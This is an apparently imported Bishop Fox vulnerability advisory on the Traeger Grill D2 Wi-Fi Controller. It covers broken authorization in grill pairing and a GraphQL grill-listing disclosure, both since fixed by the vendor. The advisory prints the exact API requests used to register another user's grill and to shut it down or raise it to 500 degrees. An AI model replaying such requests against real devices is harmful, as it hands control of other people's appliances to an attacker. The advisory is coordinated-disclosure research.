---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-02_traeger-grill-d2-wi-fi-controller-version-20204.md
original_filename: 2024-07-02_traeger-grill-d2-wi-fi-controller-version-20204.md
title: Traeger Grill D2 Wi-Fi Controller, Version 2.02.04
category: documents
detected_topics:
- jwt
- api-security
- sso
- access-control
- command-injection
- path-traversal
tags:
- imported
- documents
- jwt
- api-security
- sso
- access-control
- command-injection
- path-traversal
language: en
raw_sha256: ad36d7ebf7afe3fa27ff82663763aeedf6e21d8a796f86fefc716bc0de7badfa
text_sha256: a2cbec2b47db6798c2530f94359f4b1755ff7c7aea592131be64f558750b3bec
ingested_at: '2026-06-28T07:32:35Z'
sensitivity: unknown
redactions_applied: true
---

# Traeger Grill D2 Wi-Fi Controller, Version 2.02.04

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-02_traeger-grill-d2-wi-fi-controller-version-20204.md
- Source Type: markdown
- Detected Topics: jwt, api-security, sso, access-control, command-injection, path-traversal
- Ingested At: 2026-06-28T07:32:35Z
- Redactions Applied: True
- Raw SHA256: `ad36d7ebf7afe3fa27ff82663763aeedf6e21d8a796f86fefc716bc0de7badfa`
- Text SHA256: `a2cbec2b47db6798c2530f94359f4b1755ff7c7aea592131be64f558750b3bec`


## Content

---
title: "Traeger Grill D2 Wi-Fi Controller, Version 2.02.04"
page_title: "Traeger Grill D2 Wi-Fi Controller, Version 2.02.04… | Bishop Fox"
url: "https://bishopfox.com/blog/traeger-wifi-controller-advisory"
final_url: "https://bishopfox.com/blog/traeger-wifi-controller-advisory"
authors: ["Nick Cerne"]
programs: ["Traeger"]
bugs: ["IoT", "Broken authorization", "Information disclosure"]
publication_date: "2024-07-02"
added_date: "2024-07-22"
source: "pentester.land/writeups.json"
original_index: 202
---

Share

[ ](https://www.facebook.com/share.php?u=https://bishopfox.com/blog/traeger-wifi-controller-advisory&amp;utm_medium=social&amp;utm_source=facebook) [ ](https://twitter.com/intent/tweet?url=https://bishopfox.com/blog/traeger-wifi-controller-advisory&utm_medium=social&utm_source=twitter&source=tweetbutton&text=) [ ](http://www.linkedin.com/shareArticle?mini=true&url=https://bishopfox.com/blog/traeger-wifi-controller-advisory&utm_medium=social&utm_source=linkedin) [ ](/feeds/advisories.rss)

The following document describes identified vulnerabilities in the Traeger Grill Wi-Fi Controller. In addition, you can get a comprehensive look into the [product security review](https://bishopfox.com/services/penetration-testing-services/product-security-review) methodology we used to hack the product in our [latest blog](https://bishopfox.com/blog/methodology-for-traeger-grill-hack).

### Product Vendor

Traeger

### Product Description

The Traeger Grill D2 Wi-Fi Controller is an embedded device that allows users to connect to and control their Traeger grills remotely with a mobile device. The product’s official website is <https://traeger.com>. The latest version of the device firmware is 2.02.04, released on November 07, 2023.

### Vulnerabilities List

Two vulnerabilities and two informational issues were identified that affected the Traeger Grill Wi-Fi Controller:

  * Insufficient Authorization Controls
  * Sensitive Information Disclosure
  * Unencrypted Firmware
  * Exposed Debug Ports

### Affected Version

Version 2.02.04

### Solution

Traeger has advised Bishop Fox that updated firmware has been distributed to grills affected by the Insufficient Authorization Controls vulnerability. Traeger grills install [firmware updates automatically](https://support.traeger.com/hc/en-us/articles/4407219760411-Traeger-Firmware-Not-Updating), meaning that grills connected to the internet should already be updated by the time this disclosure is released. Bishop Fox also recommends using the physical power switch to turn off grills when not in use. 

Traeger has disabled the GraphQL operation discussed in the Sensitive Information Disclosure finding. No action is necessary for Traeger customers.

  

## Insufficient Authorization Controls

Bishop Fox staff identified one instance of Insufficient Authorization Controls that gave Bishop Fox staff the ability to control other users’ grills. Specifically, the API responsible for grill registration lacked sufficient authorization controls to prevent users from registering other users’ existing grills if an attacker obtained the grills’ 48-bit identifiers. Consequently, an attacker could leverage this finding to control another user’s grill and carry out sensitive operations such as changing the temperature during a cooking cycle.  

### Vulnerability Details

Vulnerability Type: Insufficient Authorization controls

Access Vector: ☒ Remote, ☐ Local, ☐ Physical, ☐ Context dependent, ☐ Other (if other, please specify)

Impact: ☐ Code execution, ☐ Denial of service, ☐ Escalation of privileges, ☐ Information disclosure, ☒ Unauthorized Access to Sensitive Operations

Security Risk: ☐ Critical, ☒ High, ☐ Medium, ☐ Low

Vulnerability: CWE-284

CVSS Base Score: 7.1

CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:H

The target grill’s 48-bit identifier must be known to the attacker for the exploit to work. This identifier can be recovered by capturing the network traffic during the pairing process, as discussed in Appendix A, or by scanning the QR code on the “Hello, My Name Is” sticker attached to the inside of the grill’s pellet hopper.

To exploit this issue, Bishop Fox staff retrieved a pairing token from a Traeger API and subsequently used it to register the grill to AWS IoT. For demonstration purposes, Bishop Fox staff performed this test on another employee’s grill which Bishop Fox staff did not have access to. 

**Request**
  
  
  POST /prod/pairing-sessions HTTP/2
  Host: 1ywgyc65d1.execute-api.us-west-2.amazonaws.com
  Authorization: COGNITO_TOKEN
  …omitted for brevity…
  
  {"thingName":"XXXXXXXXF79B"}
  

**Response**
  
  
  HTTP/2 200 OK
  Content-Type: application/json
  …omitted for brevity…
  
  {"pairingToken":" daf7b23595e63dddc5e1f0c4d989e3e107ba620c75df4bd0066b7fe3f1603da6","thingName":"XXXXXXXXF79B"}
  

As shown above, the API returned a pairing token for the other consultant’s grill which had a grill ID of XXXXXXXXF79B. After retrieving the pairing token, Bishop Fox staff issued a subsequent request to the /certs API which was responsible for finalizing the grill’s registration to AWS IoT and associating the grill with the user’s Cognito identity. The API accepted a self-generated certificate signing request, demonstrating that the one generated by the embedded device was not needed. 

**Request**
  
  
  POST /certs HTTP/2
  Host: durable-api.iot.traegergrills.io
  Authorization: daf7b23595e63dddc5e1f0c4***REDACTED-SUSPECT-TOKEN***  …omitted for brevity…
  
  {
  "thingName": "XXXXXXXXF79B",
  "csr": "-----BEGIN CERTIFICATE REQUEST-----\nMIICqDCCAZACAQAwYzELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAkhXMQowCAYDVQQHDAFhMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQxCjAIBgNVBAsMAWQxDDAKBgNVBAMMA2JvYjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPueyA6os9H7V7T65nd8rm5mTrbpSSFYFheRYN3aaZ8gvROWUJnz3b6EKKzSwBWaQCJEAY1fMsicAMuOpq+u6YMFq1utda4uLaVRzGfbJBIKMOAAYaoC/lp8iwA0Z3HRUWx/kVO2shBal7mm7kgq+i9vGf/k2qG2Phx/aqvcaJpsKskTt9pz5GdYpBKav8FEg2YW601JXEY4+MIylDbU3Y0DAdSftYzaYk7Ol64eqGz/1DRaww5VNAaRz5TdIYaKbalphLr7rPwaui76pmbgNLXzMXnhwQeh4nwn0ObdwWX+OOBRTmKM8vg6r+AqRR4tkZFX7qGU3rXsC3S29lA48I8CAwEAAaAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+J4qAwpvur1AM2XPKSE7aOM1+E5Rbn7uSpjuROc5Q7O764kGNsptJaUgX8PrS4OW3O1n9sQOHbLF6Qya4ay2MUPApvekw5OwmaNY1YnTquhPlGy11Dad5smuyrEMN7Zl5GGH2F0/q3pa2Jt7cnLWj2gfFIMC8d3HxFNTPbf/ZhJnE1eElwtNS0DFkrTbgDRo3Smu+BjLljMFRVonbfZefBxrIEx8ghgVzyKMJe0w7C9e6Mt4so2OJTuh2MGZmRa1IaeSm0tND5JS/YdLcXm58O7b9M61uKMgOyerxbiTp/LyaHlUmoVIElcGGz2R/WHi5pLuHKsxscbqX//mo2lnS\n-----END CERTIFICATE REQUEST-----\n"
  }
  

**Response**
  
  
  HTTP/2 200 OK
  Content-Type: application/json
  …omitted for brevity…
  
  {"certificate":"-----BEGIN CERTIFICATE-----\nMIIDnzCCAoegAwIBAgIVAJjiNeO0iQb6uEBVsJWLGgPFSyHiMA0GCSqGSIb3DQEB\nCwUAME0xSzBJBgNVBAsMQkFtYXpvbiBXZWIgU2VydmljZXMgTz1BbWF6b24uY29t\nIEluYy4gTD1TZWF0dGxlIFNUPVdhc2hpbmd0b24gQz1VUzAeFw0yMzEyMjkyMTM5\nMTNaFw00OTEyMzEyMzU5NTlaMGMxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJIVzEK\nMAgGA1UEBwwBYTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMQow\nCAYDVQQLDAFkMQwwCgYDVQQDDANib2IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw\nggEKAoIBAQD7nsgOqLPR+1e0+uZ3fK5uZk626UkhWBYXkWDd2mmfIL0TllCZ892+\nhCis0sAVmkAiRAGNXzLInADLjqavrumDBatbrXWuLi2lUcxn2yQSCjDgAGGqAv5a\nfIsANGdx0VFsf5FTtrIQWpe5pu5IKvovbxn/5Nqhtj4cf2qr3GiabCrJE7fac+Rn\nWKQSmr/BRINmFutNSVxGOPjCMpQ21N2NAwHUn7WM2mJOzpeuHqhs/9Q0WsMOVTQG\nkc+U3SGGim2paYS6+6z8Grou+qZm4DS18zF54cEHoeJ8J9Dm3cFl/jjgUU5ijPL4\nOq/gKkUeLZGRV+6hlN617At0tvZQOPCPAgMBAAGjYDBeMB8GA1UdIwQYMBaAFDs+\nx7e9MVP5WVrTFdjYaMA6B3rxMB0GA1UdDgQWBBSMBnG/mK18RDmXDz4hZpHJYUhi\n0zAMBgNVHRMBAf8EAjAAMA4GA1UdDwEB/wQEAwIHgDANBgkqhkiG9w0BAQsFAAOC\nAQEAQc5zXuxgl1/6Bj3Bq6l/mO7u+/kV97ntVyNoEEbg+QGneXe3Xp/Ti7Q66Vb5\nNNaJQrufWzIzbtvWLJpyHAVLw3Mrg9sp6Ity9snpJYy220U3IYUcrUu/H0nOfz//\nY0mez7kPTBbN/Iiq74L30+dhg1sRN8TLfZpgnQoaSSH3/Nj/mPALE/d57q2BPrym\n8KrqyIhtF7SI55FqrMGgS42R5TRJaiRn0wnDll41e/gNc8oLFicSYuhh2QegiYTN\nAQ9CeMBf3bKFIVkl6eTwd0qNyJClm8uKBhzChpOk9zOYWYwHhwnR44ny5SOmrD/+\nVz9wN4QqaKwOOhcObYJ5qqXReA==\n-----END CERTIFICATE-----\n"}

Interestingly, the above request did not invalidate the grill’s current mqtts connection as it was still capable of receiving commands. After registering the grill, Bishop Fox staff observed that the grill was now present in their mobile application, and it appeared that commands could now be issued to it. For example, the following request/response pair shows a request to shut down the grill:

**Request**
  
  
  POST /prod/things/XXXXXXXXF79B/commands HTTP/2
  Host: 1ywgyc65d1.execute-api.us-west-2.amazonaws.com
  Authorization: [NEW_COGNITO_TOKEN]
  …omitted for brevity…
  
  {
  "command": "17"
  }

**Response**
  
  
  HTTP/2 200 OK
  Content-Type: application/json; charset=utf-8
  …omitted for brevity…
  
  {}
  

After issuing the command, the other consultant confirmed that the grill had entered the shutdown cycle as shown in Figure 1.

![Picture of the grill display showing it shut down after receiving remote command.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/traeger-grill-shutdown.jpg)FIGURE 1 - Grill shutting down after receiving remote command

Other commands could also be issued to the grill such as waking the grill from a standby state (if the physical power switch was still in the powered-on position) or adjusting the temperature during a cooking cycle. To demonstrate this, Bishop Fox staff contrived a scenario in which the other consultant was barbecuing a block of tofu for dinner. 

![picture of the grill opened with a well-seasoned piece of tofu ready to be grilled.](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/tofu-ready.png)FIGURE 2 – Block of well-seasoned tofu ready to be grilled

After placing the block of tofu on the grill, the consultant ignited the grill and set the temperature to 165 degrees Fahrenheit. Subsequently, Bishop Fox staff issued a grill command to change the temperature to 500 degrees. 

**Request**
  
  
  POST /prod/things/XXXXXXXXF79B/commands HTTP/2
  Host: 1ywgyc65d1.execute-api.us-west-2.amazonaws.com
  Authorization: [NEW_COGNITO_TOKEN]
  …omitted for brevity…
  
  {
  "command" : "11,500"
  }

**Response**
  
  
  HTTP/2 200 OK
  Content-Type: application/json; charset=utf-8
  …omitted for brevity…
  
  {}

Following this, the grill received the command and adjusted its target temperature to 500 degrees. After a short while, the temperature reached 500 degrees and the grill began to billow smoke.

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/500-degrees.png)FIGURE 4 – Grill reaching 500 degrees and billowing smoke

Instead of being smoked into a delicious meal, the tofu was reduced to a blackened, inedible crisp. 

![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/ruined-bbq.png)FIGURE 5 – A ruined barbecue 

For a detailed explanation of how Bishop Fox staff made these discoveries, please refer to our [Traeger blog post](https://bishopfox.com/blog/methodology-for-traeger-grill-hack).**  
**

## Sensitive Information Disclosure

Bishop Fox staff discovered that the GraphQL API called by the mobile application contained a ListGrills operation which disclosed every grill currently registered with Traeger. This also consisted of device friendlyNames which were defined by the grill owners. Calling the API required an API key (which was hardcoded into the mobile application) as well as an AWS Cognito Json Web Token (JWT) which could be retrieved by registering and authenticating to the mobile application. 

In response to Bishop Fox’s vulnerability report, Traeger disabled the ListGrills operation entirely. It is no longer accessible.

### Vulnerability Details

Vulnerability Type: Sensitive Information Disclosure

Access Vector: ☒ Remote, ☐ Local, ☐ Physical, ☐ Context dependent, ☐ Other (if other, please specify)

Impact: ☐ Code execution, ☐ Denial of service, ☐ Escalation of privileges, ☒ Information disclosure, ☐ Other (if other, please specify)

Security Risk: ☐ Critical, ☐ High, ☒ Medium, ☐ Low

Vulnerability: CWE-200

CVSS Base Score: 4.3

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N

To demonstrate this issue, Bishop Fox staff issued the following POST request to interact with the API:

**Request**
  
  
  POST / HTTP/1.1
  Host: api.kube-gql.prod.traegergrills.io
  …omitted for brevity…
  X-Api-Key=***REDACTED*** API KEY]
  Authorization: [REDACTED JWT]
  …omitted for brevity…
  
  {"query":"query ListGrills($limit: Int) {\n  listGrills(limit: $limit) {\n  items {\n  createdAt\n  deviceTypeId\n  friendlyName\n  id\n  modelNumber\n  grillModel {\n  
  modelNumber\n  name\n  description\n  }\n  userId\n  serialNumber\n  productId\n  }\n  }\n}","variables":{"limit":10},"operationName":"ListGrills"}
  

**Response**
  
  
  HTTP/1.1 200 OK
  X-Powered-By: Express
  …omitted for brevity…
  
  {"data":{"listGrills":{"items":[{"createdAt":"2021-03-05T13:19:09.994Z","deviceTypeId":null,"friendlyName":"Stoked on 
  Smoke","id":"55bf5cb5-264a-48d3-ab55-1b9b1d57c2a0","modelNumber":null,"grillModel":null,"userId":"4e672e78-8386-4b5a-bde9-49bd54742cb9","serialNumber":"Stoked on 
  Smoke","productId":"481226c7-8c5d-411a-8449-aba9b480e465"}
  …omitted for brevity…
  

****As shown above, the above query could return every grill registered with Traeger. However, the information did not include the 48-bit identifier necessary to pair the mobile application with the grills.

The growing prevalence of IoT devices such as the grill has introduced new security challenges, making comprehensive product security reviews crucial for safeguarding connected environments. This research not only demonstrates Bishop Fox’s commitment to protecting these IoT devices from emerging threats, but also reinforces our comprehensive service offerings, which include thorough product security reviews.  

For more details, we recommend reading our blog where we go in depth on the methodology used during Bishop Fox’s review of the Traeger Grill Wi-Fi Controller product.

### Credits

Nick Cerne, Security Consultant III, Bishop Fox ([[email protected]](/cdn-cgi/l/email-protection))  

### Timeline

  * 12/25/2023: Initial discovery
  * 01/17/2024: Contact with vendor
  * 03/19/2024: In-depth discussion with vendor
  * 07/03/2024: Vulnerabilities publicly disclosed********

* * *

![Nick Cerne Headshot](https://assets.bishopfox.com/prod-1437/Images/author-photos/Nick-Cerne-Headshot.png)

By Nick Cerne 

Senior Security Consultant

Nicholas Cerne is a Senior Security Consultant at Bishop Fox, specializing in [application penetration testing](https://bishopfox.com/services/penetration-testing-services/application-security), hybrid application assessments, and cloud environment testing. He also enjoys conducting [IoT security research](https://bishopfox.com/services/penetration-testing-services/product-security-review) as a hobby. Nicholas holds the Offensive Security Certified Professional ([OSCP](https://www.offsec.com/)), Offensive Security Web Expert ([OSWE](https://www.offsec.com/)), and Security+ certifications. 

He graduated with a B.S. in Cybersecurity from [Virginia Tech](https://cyber.vt.edu/), where he formerly served as president of the university's Cybersecurity Club.

[ More by Nick Cerne  ](https://bishopfox.com/authors/nick-cerne)

[ ](https://www.linkedin.com/in/nick-cerne/)

![](/static/assets/images/backgrounds/lander-header-bg-black-lines.svg)

Subscribe to our blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.
